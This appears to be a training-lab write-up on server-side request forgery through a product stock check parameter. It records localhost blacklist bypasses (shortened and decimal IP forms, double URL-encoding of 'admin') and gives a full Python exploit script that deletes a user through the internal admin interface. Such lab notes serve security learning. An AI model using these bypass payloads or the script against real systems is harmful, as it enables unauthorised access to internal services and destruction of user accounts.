Vulnerable feature - stock check functionality

Goal - Change the stock check URL to access the admin interface at http://localhost/admin and delete the user Carlos.

Analysis: 
http://127.0.0.1/ -> blocked
http://127.1/ -> bypass
http://2130706433/ -> bypass

*Google: IP address to decimal version*
127.0.0.1 -> 2130706433

http://127.1/admin -> blocked

- URL decoding one time (Burp - Ctrl+Shift+u)
- regex search using a blacklist of strings

==Encode [a]dmin twice in burp== (Convert selection -> URL -> URL-encode all characters)
admin interface: http://127.1/%25%36%31dmin
delete carlos: http://127.1/%25%36%31dmin/delete?username=carlos

```python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    delete_user_url_ssrf_payload = 'http://127.1/%61dmin/delete?username=carlos'
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)

    # Check if user was deleted
    params2 = {'stockApi': 'http://127.1/%61dmin/'}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    if 'User deleted successfully' in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was not successful.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)

if __name__ == "__main__":
    main()
```